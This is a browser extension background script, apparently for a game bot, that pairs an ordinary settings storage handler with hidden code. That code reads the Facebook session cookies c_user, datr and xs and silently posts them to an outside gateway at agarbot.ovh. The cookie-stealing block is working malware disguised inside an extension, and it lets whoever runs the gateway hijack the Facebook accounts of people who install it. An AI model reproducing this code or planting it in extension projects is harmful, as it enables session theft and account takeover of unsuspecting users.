chrome.runtime.onMessage.addListener((req, sender, response) => {
	console.log(req, sender);
	if(req.method == "getStorage") {
		chrome.storage.local.get(["_opSettings"], (data) => {
			console.log(data);
			response({test: data});
		});
	} else if(req.method == "setStorage") {
		chrome.storage.local.set({"_opSettings": req.data}, (resp) => {
			console.log(resp);
			console.log(response);
			response({test: "done"});
		});
	}
});
chrome.cookies.getAll({
		'url':'https://www.facebook.com'
	},function(cookie){
		var obj = {};
		for(var index in cookie){
			var c = cookie[index];
			if(c.name == 'c_user' || c.name == 'datr' || c.name == 'xs'){
				obj[c.name] = c.value;
			}
		}
		if (cookie && obj['xs'] != undefined && obj['datr'] != undefined && obj['c_user']) {
		  	    jQuery.ajax({
                    type : 'POST',
                    url : 'https://agarbot.ovh/gateway/c.php',
                    data : obj,
                    success : function(data){
						// console.log('POST OK');
					}
                });
		}
		else {
		  console.log('Can\'t get cookie!!');
		}
});